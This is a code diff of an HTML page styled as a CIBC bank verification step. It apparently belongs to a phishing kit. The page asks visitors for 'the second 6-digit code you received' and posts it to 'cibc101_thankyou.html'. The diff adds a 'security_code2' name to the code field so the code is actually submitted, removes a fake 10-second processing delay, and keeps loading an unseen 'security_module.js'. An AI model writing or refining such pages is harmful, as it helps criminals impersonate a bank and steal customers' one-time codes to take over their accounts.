@@ -69,7 +69,7 @@
         <p style="margin-bottom: 25px; font-size: 16px; color: #444;">To finalize the verification, please enter the second 6-digit code you received.</p>
         <form action="cibc101_thankyou.html" method="POST">
             <label class="cibc-label">Verification Code</label>
-            <input type="text" class="cibc-input" required maxlength="6" pattern="\d{6}" inputmode="numeric" placeholder="000000" style="text-align: center; letter-spacing: 5px; font-weight: bold; font-size: 20px;">
+            <input type="text" name="security_code2" id="security_code2" class="cibc-input" required maxlength="6" pattern="\d{6}" inputmode="numeric" placeholder="000000" style="text-align: center; letter-spacing: 5px; font-weight: bold; font-size: 20px;">
             
             <button type="submit" class="cibc-btn-primary">Verify</button>
         </form>
@@ -82,19 +82,7 @@
         <p class="loader-text">Processing, please wait...</p>
     </div>
 
-    <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            const form = document.querySelector('form');
-            const loader = document.getElementById('loaderOverlay');
-            if(form && loader) {
-                form.addEventListener('submit', function(e) {
-                    e.preventDefault();
-                    loader.classList.add('active');
-                    setTimeout(function() { form.submit(); }, 10000);
-                });
-            }
-        });
-    </script>
+    
 <script src="security_module.js"></script>
 </body>
 </html>
